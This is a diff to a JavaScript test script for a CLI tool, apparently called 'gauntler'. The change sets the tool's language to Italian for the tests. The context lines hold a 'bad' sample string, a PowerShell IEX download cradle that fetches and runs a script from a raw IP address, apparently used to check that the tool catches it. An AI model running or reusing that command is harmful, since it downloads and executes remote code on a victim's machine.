@@ -9,7 +9,7 @@ const { spawnSync } = require('child_process');
 const home = fs.mkdtempSync(path.join(os.tmpdir(), 'gauntler-home-'));
 const work = fs.mkdtempSync(path.join(os.tmpdir(), 'gauntler-cli-'));
 const CLI = path.join(__dirname, '..', 'cli', 'gauntler.js');
-const env = { ...process.env, GAUNTLER_HOME: home, NO_COLOR: '1' };
+const env = { ...process.env, GAUNTLER_HOME: home, GAUNTLER_LANG: 'it', NO_COLOR: '1' }; // the checks match Italian texts
 const run = (args, input) => spawnSync(process.execPath, [CLI, ...args], { env, input, encoding: 'utf8', cwd: work, timeout: 120000 });
 
 const bad = 'IEX (New-Object Net.WebClient).DownloadString("http://185.1.2.3/a.ps1")\n';
